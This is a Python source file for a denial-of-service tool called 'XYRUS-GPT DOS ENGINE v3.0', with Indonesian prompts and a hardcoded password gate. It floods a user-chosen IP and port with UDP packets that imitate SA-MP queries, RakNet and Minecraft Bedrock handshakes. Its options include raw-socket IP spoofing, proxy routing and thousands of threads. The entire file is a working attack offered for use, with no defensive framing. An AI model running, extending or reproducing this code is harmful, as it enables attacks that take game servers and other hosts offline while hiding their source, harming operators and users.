#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XYRUS-GPT DOS ENGINE v3.0 - VPS EDITION
- Raw socket spoofing
- Proxy support (SOCKS5/HTTP)
- Multi-threading extreme
- Payload amplification
"""

import socket
import random
import threading
import time
import os
import sys
import struct
import signal
from collections import deque
import argparse

# ==================== DEPENDENCIES ====================
try:
    import socks  # pysocks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("[!] pysocks not installed. Proxy support disabled. Install with: pip install pysocks")

# ==================== KONFIGURASI AWAL ====================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print("\033[36m" + "="*50)
    print("    XYRUS-GPT DOS ENGINE v3.0")
    print("    VPS Edition - Maximum Destruction")
    print("="*50 + "\033[0m")

def login():
    banner()
    user = input("Username : ")
    pw = input("Password : ")
    if user != "DAMAR" or pw != "DAMAR":
        print("\033[31m[!] Akses ditolak. Kembali ke kegelapan...\033[0m")
        sys.exit(1)
    print("\033[32m[+] Autentikasi berhasil. Memuat senjata...\033[0m")
    time.sleep(1)

login()

# ==================== INPUT ====================
banner()
target = input("Target IP       : ")
port = int(input("Target Port     : ") or 7777)
threads = int(input("Threads         : ") or 2000)
duration = int(input("Duration (detik): ") or 120)
spoof = input("Spoof IP? (y/n) : ").lower() == 'y'
proxy_type = input("Proxy type (none/socks5/http) [none]: ").lower() or 'none'
proxy_addr = None
if proxy_type != 'none':
    proxy_addr = input("Proxy address (ip:port) : ")

# ==================== SOCKET SETUP ====================
# Raw socket for spoofing
s_raw = None
if spoof:
    try:
        s_raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s_raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        print("[+] Raw socket enabled (IP spoofing aktif)")
    except PermissionError:
        print("[!] Raw socket butuh root. Spooffing dinonaktifkan.")
        spoof = False
    except Exception as e:
        print(f"[!] Raw socket error: {e}. Spooffing dinonaktifkan.")
        spoof = False

# Proxy setup for non-spoof mode
if proxy_type != 'none' and not spoof and SOCKS_AVAILABLE:
    try:
        proxy_ip, proxy_port = proxy_addr.split(':')
        proxy_port = int(proxy_port)
        socks.set_default_proxy(
            socks.SOCKS5 if proxy_type == 'socks5' else socks.HTTP,
            proxy_ip, proxy_port
        )
        socket.socket = socks.socksocket
        print(f"[+] Proxy {proxy_type.upper()} aktif: {proxy_addr}")
    except Exception as e:
        print(f"[!] Proxy gagal: {e}. Lanjut tanpa proxy.")
        proxy_type = 'none'

# ==================== PAYLOAD GENERATOR ====================
def random_ip():
    return ".".join(str(random.randint(1,254)) for _ in range(4))

def random_bytes(size):
    return os.urandom(size)

# IP Header untuk spoofing
def ip_header(src_ip, dst_ip, payload_len):
    return struct.pack('!BBHHHBBH4s4s',
                       0x45, 0, payload_len + 20, 0, 64, 0, 255, 0,
                       socket.inet_aton(src_ip),
                       socket.inet_aton(dst_ip))

# SAMP Query Packet
def samp_query(src_ip=None):
    ip_parts = [int(x) for x in target.split('.')]
    samp_header = b'SAMP' + bytes(ip_parts) + struct.pack('<H', port) + b'i'
    # Tambah random padding (0-1024 bytes)
    samp_header += random_bytes(random.randint(0, 1024))
    if spoof and src_ip:
        return ip_header(src_ip, target, len(samp_header)) + samp_header
    return samp_header

# RakNet Payload dengan variasi dan amplifikasi
raknet_base = [
    b'\x01' + random_bytes(30),   # Unconnected Ping
    b'\x05' + random_bytes(30),   # Open Connection Request 1
    b'\x07' + random_bytes(50),   # Connection Request
    b'\x00' * 256,                # Null payload
    b'\xFF' * 512,                # Flood maksimal
]

def raknet_payload(src_ip=None):
    base = random.choice(raknet_base)
    # Amplifikasi: ulang payload berkali-kali
    mult = random.randint(10, 50)
    payload = base * mult
    # Tambah random trailing
    payload += random_bytes(random.randint(512, 2048))
    if spoof and src_ip:
        return ip_header(src_ip, target, len(payload)) + payload
    return payload

# Minecraft Bedrock (RakNet Open Connection Request 1)
def bedrock_payload(src_ip=None):
    magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
    payload = b'\x05' + magic + random_bytes(16)
    # Amplifikasi dengan duplikasi
    mult = random.randint(20, 100)
    payload = payload * mult
    payload += random_bytes(random.randint(256, 1024))
    if spoof and src_ip:
        return ip_header(src_ip, target, len(payload)) + payload
    return payload

# ==================== FLOOD FUNCTIONS ====================
stats = {
    'sent': 0,
    'lock': threading.Lock()
}
stop_flag = threading.Event()

def update_stats(count=1):
    with stats['lock']:
        stats['sent'] += count

def samp_flood():
    if spoof:
        sock = s_raw
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if proxy_type != 'none':
            # socks socket already patched
            pass

    end = time.time() + duration
    while not stop_flag.is_set() and time.time() < end:
        try:
            src = random_ip() if spoof else None
            packet = samp_query(src)
            if spoof:
                sock.sendto(packet, (target, 0))
            else:
                sock.sendto(packet, (target, port))
            update_stats()
        except:
            pass

def raknet_flood():
    if spoof:
        sock = s_raw
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    end = time.time() + duration
    while not stop_flag.is_set() and time.time() < end:
        try:
            src = random_ip() if spoof else None
            packet = raknet_payload(src)
            if spoof:
                sock.sendto(packet, (target, 0))
            else:
                sock.sendto(packet, (target, port))
            update_stats()
        except:
            pass

def bedrock_flood():
    if spoof:
        sock = s_raw
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    end = time.time() + duration
    while not stop_flag.is_set() and time.time() < end:
        try:
            src = random_ip() if spoof else None
            packet = bedrock_payload(src)
            if spoof:
                sock.sendto(packet, (target, 0))
            else:
                sock.sendto(packet, (target, port))
            update_stats()
        except:
            pass

# ==================== STATISTICS THREAD ====================
def stats_printer():
    start = time.time()
    last_sent = 0
    while not stop_flag.is_set():
        time.sleep(1)
        elapsed = time.time() - start
        if elapsed <= 0:
            continue
        current = stats['sent']
        rate = (current - last_sent) / 1.0
        total_rate = current / elapsed
        print(f"\r\033[32m[+] Packets: {current} | Rate: {rate:.0f}/s | Avg: {total_rate:.0f}/s\033[0m", end='', flush=True)
        last_sent = current

# ==================== MAIN ====================
def main():
    global stop_flag

    # Pilih mode flood
    print("\n[+] Pilih mode serangan:")
    print("    1. SAMP Query Flood")
    print("    2. RakNet Payload Flood")
    print("    3. Minecraft Bedrock Flood")
    print("    4. ALL (kombinasi semua)")
    mode = input("Mode [4]: ") or "4"
    modes = []
    if mode == "1":
        modes = [samp_flood]
    elif mode == "2":
        modes = [raknet_flood]
    elif mode == "3":
        modes = [bedrock_flood]
    else:
        modes = [samp_flood, raknet_flood, bedrock_flood]

    print(f"\n\033[31mMenyerang {target}:{port} dengan metode:\033[0m")
    for m in modes:
        print(f"  - {m.__name__}")
    if spoof:
        print("  - IP Spoofing aktif (random source IP)")
    if proxy_type != 'none':
        print(f"  - Proxy aktif ({proxy_type.upper()})")

    print(f"\n[+] Threads: {threads}")
    print(f"[+] Durasi: {duration} detik")
    print("[+] Tekan Ctrl+C untuk hentikan.\n")

    # Jalankan thread
    thread_pool = []
    for _ in range(threads):
        for func in modes:
            t = threading.Thread(target=func, daemon=True)
            t.start()
            thread_pool.append(t)
            # Stagger agar tidak overload CPU
            time.sleep(0.0001)

    # Statistik thread
    stat_thread = threading.Thread(target=stats_printer, daemon=True)
    stat_thread.start()

    # Tunggu durasi atau interupsi
    try:
        time.sleep(duration)
        stop_flag.set()
    except KeyboardInterrupt:
        print("\n\033[31m[!] Dihentikan manual.\033[0m")
        stop_flag.set()

    # Tunggu semua thread selesai
    for t in thread_pool:
        t.join(timeout=0.5)

    print(f"\n\033[31m[+] Serangan selesai. Total packets: {stats['sent']}\033[0m")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
